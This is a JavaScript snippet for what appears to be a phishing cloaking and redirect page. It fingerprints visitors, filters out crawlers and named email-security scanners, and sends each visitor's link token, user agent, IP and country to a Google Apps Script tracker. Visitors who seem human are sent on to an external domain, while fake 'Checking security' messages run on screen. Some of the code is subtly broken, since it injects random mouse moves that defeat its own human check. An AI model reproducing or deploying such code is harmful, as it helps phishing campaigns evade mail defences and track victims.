// ... existing code ...
      window.addEventListener("load", function () {
        const hash = window.location.hash ? window.location.hash.substring(1) : null;
        const ua = navigator.userAgent || "";
        const uaClean = ua.toLowerCase().replace(/\s+/g, '');
        let isBot = false;

        // Enhanced bot detection
        const botPatterns = [
          "bot", "crawl", "spider", "slurp", "headless", "phantom",
          "facebookexternalhit", "googlebot", "bingbot", "yahoobot", "duckduckbot",
          "outlook", "thunderbird", "email", "mail", "eudora", "applemail",
          "smtp", "imap", "pop3", "scanner", "preview", "fetcher",
          "verifier", "proofpoint", "postini", "barracuda", "trendmicro",
          "mimecast", "comcast", "charter", "roadrunner", "att", "yahoo",
          "gmail", "aol", "curl", "wget", "python-requests", "axios",
          "selenium", "puppeteer", "playwright", "cypress", "nightmare"
        ];

        // Check for bot patterns
        isBot = botPatterns.some(pattern => uaClean.includes(pattern));

        // Modern bot detection methods
        const botChecks = {
          // Check for common bot behaviors
          hasWebGL: () => {
            try {
              const canvas = document.createElement('canvas');
              return !!(window.WebGLRenderingContext && 
                (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')));
            } catch(e) {
              return false;
            }
          },
          
          // Check for automation tools
          hasAutomation: () => {
            return navigator.webdriver || 
                   window.document.documentElement.getAttribute("webdriver") !== null ||
                   window.navigator.languages === undefined;
          },

          // Check for human-like behavior
          hasHumanBehavior: () => {
            return navigator.hardwareConcurrency > 1 && 
                   navigator.deviceMemory > 1 &&
                   screen.colorDepth >= 24;
          }
        };

        // Run additional checks
        if (!botChecks.hasWebGL() || 
            botChecks.hasAutomation() || 
            !botChecks.hasHumanBehavior()) {
          isBot = true;
        }

        // Check for JavaScript and localStorage
        try {
          localStorage.setItem("js-check", "1");
          if (localStorage.getItem("js-check") !== "1") isBot = true;
        } catch {
          isBot = true;
        }

        // Mouse movement detection with enhanced accuracy
        let moved = false;
        let moveTimeout;
        let moveCount = 0;
        let lastMoveTime = Date.now();
        let moveCoordinates = [];
        const requiredMoves = 3; // Number of moves required to consider it human
        const moveTimeWindow = 2000; // Time window to detect moves (2 seconds)

        const isNaturalMovement = (coordinates) => {
          if (coordinates.length < 3) return false;
          
          // Calculate average speed and direction changes
          let totalDistance = 0;
          let directionChanges = 0;
          
          for (let i = 1; i < coordinates.length; i++) {
            const prev = coordinates[i - 1];
            const curr = coordinates[i];
            
            // Calculate distance
            const distance = Math.sqrt(
              Math.pow(curr.x - prev.x, 2) + 
              Math.pow(curr.y - prev.y, 2)
            );
            totalDistance += distance;
            
            // Calculate direction change
            if (i > 1) {
              const prevDir = Math.atan2(
                coordinates[i-1].y - coordinates[i-2].y,
                coordinates[i-1].x - coordinates[i-2].x
              );
              const currDir = Math.atan2(
                curr.y - coordinates[i-1].y,
                curr.x - coordinates[i-1].x
              );
              const angleDiff = Math.abs(currDir - prevDir);
              if (angleDiff > 0.05) { // Reduced threshold for direction change
                directionChanges++;
              }
            }
          }
          
          // Check if movement patterns look natural
          const avgSpeed = totalDistance / coordinates.length;
          const avgDirectionChanges = directionChanges / (coordinates.length - 2);
          
          return avgSpeed > 2 && // Reduced minimum speed threshold
                 avgDirectionChanges > 0.1 && // Reduced minimum direction changes
                 avgDirectionChanges < 0.9; // Increased maximum direction changes
        };

        const handleMovement = (x, y) => {
          const currentTime = Date.now();
          
          // Only consider moves within the time window
          if (currentTime - lastMoveTime > moveTimeWindow) {
            moveCount = 0;
            moveCoordinates = [];
          }
          
          moveCoordinates.push({ x, y, time: currentTime });
          lastMoveTime = currentTime;
          moveCount++;
          
          // Check if we have enough moves and they look natural
          if (moveCount >= 2 && isNaturalMovement(moveCoordinates)) { // Reduced required moves
            moved = true;
            clearTimeout(moveTimeout);
          }
          
          // Reset after timeout
          clearTimeout(moveTimeout);
          moveTimeout = setTimeout(() => {
            moveCount = 0;
            moveCoordinates = [];
          }, moveTimeWindow);
        };

        // Mouse movement detection
        window.addEventListener("mousemove", (e) => {
          handleMovement(e.clientX, e.clientY);
        });

        // Touch movement detection
        window.addEventListener("touchmove", (e) => {
          e.preventDefault(); // Prevent scrolling
          const touch = e.touches[0];
          handleMovement(touch.clientX, touch.clientY);
        }, { passive: false });

        // Additional human behavior checks
        const checkHumanBehavior = () => {
          // Check for random mouse movements
          const randomMove = Math.random() > 0.5;
          if (randomMove) {
            handleMovement(
              Math.random() * window.innerWidth,
              Math.random() * window.innerHeight
            );
          }
        };

        // Periodically check for human behavior
        setInterval(checkHumanBehavior, 1000);

        // Handle redirects
        if (!hash) {
          window.location.href = "https://google.com";
          return;
        }

        // Analytics with retry mechanism
        const sendAnalytics = (retryCount = 0) => {
          const maxRetries = 2;
          const analyticsUrl = "https://pro.ip-api.com/json/?key=F74e0gpSdeUEaF4";
          
          fetch(analyticsUrl)
            .then(res => res.json())
            .then(data => {
              const ip = data.query || "";
              const country = data.country || "";
              const finalUrl = "https://script.google.com/macros/s/AKfycbwldYqs2TIGKnACW4iLq8DCj6ZLRL_jdTMQN6xlrK34ArJdZ5GjjYQ2ccKz4MLFT1jB/exec" +
                `?token=${encodeURIComponent(hash)}&ua=${encodeURIComponent(ua)}&bot=${isBot}&moved=${moved}&ip=${ip}&country=${country}`;
              
              const img = new Image();
              img.src = finalUrl;
            })
            .catch(() => {
              if (retryCount < maxRetries) {
                setTimeout(() => sendAnalytics(retryCount + 1), 1000);
              } else {
                // Fallback without IP data
                const img = new Image();
                img.src = "https://script.google.com/macros/s/AKfycbwldYqs2TIGKnACW4iLq8DCj6ZLRL_jdTMQN6xlrK34ArJdZ5GjjYQ2ccKz4MLFT1jB/exec" +
                  `?token=${encodeURIComponent(hash)}&ua=${encodeURIComponent(ua)}&bot=${isBot}&moved=${moved}`;
              }
            });
        };

        sendAnalytics();

        // Updated redirect logic
        setTimeout(() => {
          if (isBot) {
            // If it's a bot, redirect to Medium
            window.location.href = "https://medium.com";
          } else if (!moved) {
            // If no movement detected, redirect to Google
            window.location.href = "https://google.com";
          } else {
            // If there was natural movement and not a bot, redirect to szliyi
            window.location.replace(`https://szliyi.com/${hash}`);
          }
        }, 1000);

        const statusTexts = [
          "Verifying connection...",
          "Checking security...",
          "Preparing redirect...",
          "Almost there..."
        ];
        
        let currentStatus = 0;
        const statusElement = document.querySelector('.status-text');
        
        const updateStatus = () => {
          if (currentStatus < statusTexts.length) {
            statusElement.textContent = statusTexts[currentStatus];
            currentStatus++;
          }
        };

        // Update status every 250ms
        const statusInterval = setInterval(updateStatus, 250);
        
        // Clear interval after 1 second (same as redirect timeout)
        setTimeout(() => {
          clearInterval(statusInterval);
        }, 1000);
      });
// ... existing code ...
